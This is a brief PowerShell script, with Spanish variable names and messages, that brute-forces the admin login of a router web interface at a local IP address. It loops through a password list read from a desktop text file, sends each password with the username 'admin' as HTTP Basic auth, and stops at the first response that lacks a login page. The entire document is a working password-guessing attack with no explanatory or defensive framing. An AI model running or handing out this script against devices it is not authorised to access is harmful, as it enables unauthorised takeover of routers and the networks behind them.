$usuario = "admin"
$lista = Get-Content "C:\Users\rocio\OneDrive\Desktop\contrasenas.txt"
$ip = "192.168.0.29"

foreach ($clave in $lista) {
    $credencial = "${usuario}:${clave}"
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($credencial)
    $encoded = [Convert]::ToBase64String($bytes)

    try {
        $response = Invoke-WebRequest -Uri "http://$ip/userRpm/Index.htm" -Headers @{
            Authorization = "Basic $encoded"
        } -Method GET -UseBasicParsing -ErrorAction Stop

        if ($response.StatusCode -eq 200 -and $response.Content -notmatch "Login") {
            Write-Host "✅ ¡Login exitoso! Usuario: $usuario | Contraseña: $clave"
            break
        } else {
            Write-Host "❌ Falló: $clave"
        }

    } catch {
        Write-Host "⚠️ Error o acceso denegado con: $clave"
    }
}
